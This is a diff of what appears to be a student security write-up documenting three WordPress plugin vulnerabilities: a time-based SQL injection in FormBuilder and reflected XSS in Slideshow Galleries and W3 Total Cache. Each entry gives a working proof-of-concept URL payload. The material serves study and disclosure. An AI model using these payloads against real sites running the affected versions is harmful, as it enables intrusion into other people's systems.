@@ -11,7 +11,7 @@ Time spent: 5 hours spent in total
     - Vulnerability types: SQL Injection
     - Tested in version: 4.0 WordPress, 1.05 FormBuilder
     - Fixed in version: 1.07 FormBuilder
-  - [ ] GIF Walkthrough: <img src="https://imgur.com/AakQjyu"/>
+  - [ ] GIF Walkthrough: https://imgur.com/AakQjyu
   - [ ] Steps to recreate: I installed version 1.05 of FormBuilder as a Plugin to WordPress. I then copied a link with SQL in it (http://<target>/wp-admin/tools.php?page=formbuilder.php&fbtag&pageNumber&fbaction=exportForm&fbid=1 AND (SELECT * FROM (SELECT(SLEEP(5)))WSdS) into the search bar. 
   - [ ] Affected source code: formbuilder.php/formuilder_admin_functions.php and formbuilder/php/formbuilder_admin_pages.inc.php
  
@@ -20,7 +20,7 @@ Time spent: 5 hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.0 WordPress, 1.6.3 Tribulant Slideshow Galleries
     - Fixed in version: Not fixed
-  - [ ] GIF Walkthrough: ![Walkthrough](https://imgur.com/hCyOvYu)
+  - [ ] GIF Walkthrough: https://imgur.com/hCyOvYu
   - [ ] Steps to recreate: I installed version 1.6.3 of the Tribulant Slideshow Galleries extenstion for WordPress. I then copied a link  that inputs an XSS attack into the webpage: http://<target>/wp-admin/admin.php?page=slideshow-galleries&method=savegtlcq%5C%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3Exsxa2
   - [ ] Affected source code: view/admin/galleries/index.php
 
@@ -29,7 +29,7 @@ Time spent: 5 hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.0 WordPress, 0.9.4.1 W3 Total Cache
     - Fixed in version: 0.9.5 W3 Total Cache
-  - [ ] GIF Walkthrough: ![Walkthrough](https://imgur.com/IR83Z2I)
+  - [ ] GIF Walkthrough: https://imgur.com/IR83Z2I
   - [ ] Steps to recreate: I installed version 0.9.4.1 of W3 Total Cache for WordPress. I think copied a link which inputs an XSS attack into the webpage: http://<target>/wp-admin/admin.php?page=w3tc_support&request_type=bug_report&request_id="><script>alert('sumofpwn.nl');</script>
   - [ ] Affected source code: inc/options/support/form.php
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
